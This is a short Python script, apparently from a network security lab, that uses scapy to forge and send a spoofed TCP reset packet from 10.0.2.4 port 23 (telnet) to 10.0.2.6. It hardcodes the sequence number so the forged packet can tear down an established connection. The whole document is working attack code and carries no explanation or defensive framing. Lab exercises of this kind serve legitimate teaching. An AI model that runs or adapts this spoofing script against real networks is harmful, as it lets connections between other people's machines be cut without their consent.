#Python script to perform TCP Reset attack

import sys
from scapy.all import *

print("Sending reset packet...")
IPLayer = IP(src = "10.0.2.4", dst = "10.0.2.6")
TCPLayer = TCP(sport = 23, dport = 60466, flags = "R", seq = 3826875049)

pkt = IPLayer/TCPLayer
ls(pkt)
send(pkt, verbose =0)
